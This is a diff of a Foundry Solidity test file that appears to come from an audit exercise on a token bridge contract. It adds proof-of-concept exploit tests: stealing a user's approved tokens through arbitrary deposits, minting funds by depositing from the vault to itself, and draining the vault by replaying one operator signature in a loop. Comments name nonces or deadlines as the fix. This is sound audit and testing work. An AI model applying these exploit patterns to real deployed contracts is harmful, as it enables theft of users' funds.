@@ -234,7 +234,7 @@ contract L1BossBridgeTest is Test {
         vm.prank(user); // Alice approving the bridge to spend her tokens
         token.approve(address(tokenBridge), type(uint256).max);
 
-        // Bob stealing money
+        // Bob stealing money by depositing Alice's balance into L1 vault and receiving the funds on Bob's L2 address
         uint256 depositAmount = token.balanceOf(user);
         address attacker = makeAddr("attacker");
         vm.startPrank(attacker);
@@ -259,16 +259,17 @@ contract L1BossBridgeTest is Test {
 
         // Can trigger the deposit event when we self transfer events from vault to vault
         vm.expectEmit(address(tokenBridge));
-        emit Deposit(address(vault), attacker, vaultBalance); // q this tells foundry what event to expect in the following call!
+        emit Deposit(address(vault), attacker, vaultBalance);
         tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
 
         vm.expectEmit(address(tokenBridge));
-        emit Deposit(address(vault), attacker, vaultBalance); // q this tells foundry what event to expect in the following call!
+        emit Deposit(address(vault), attacker, vaultBalance);
         tokenBridge.depositTokensToL2(address(vault), attacker, vaultBalance); 
 
     }
 
     // test if an attacker can re-use the v, r, s signature
+    // To avoid replay attacks, use a nonce/deadline or some type of one-time use check in the signature so they can only be used once
     function testSignatureReplay() public {
         // assume the attacker and vault already holds some tokens
         uint256 vaultInitialBalance = 1000e18;
@@ -285,6 +286,8 @@ contract L1BossBridgeTest is Test {
         // attacker deposits tokens to L2
         tokenBridge.depositTokensToL2(attacker, attacker, attackerInitialBalance);
         
+        // on the L2, we called the withdrawTokensToL1 function
+
         // The signer/operator is going to sign the withdrawal on L2
         // This is the message:
         bytes memory message = abi.encode(
@@ -303,6 +306,14 @@ contract L1BossBridgeTest is Test {
             )
         );
 
+        // Because the operators signed the message once, we can replay that message until the vault is empty
+        while(token.balanceOf(address(vault)) > 0) {
+            // The attacker can replay the signature and withdraw the tokens from the vault
+            tokenBridge.withdrawTokensToL1(attacker, attackerInitialBalance, v, r, s);
+        }
+
+        assertEq(token.balanceOf(address(attacker)), attackerInitialBalance + vaultInitialBalance);
+        assertEq(token.balanceOf(address(vault)), 0);
 
     }
 
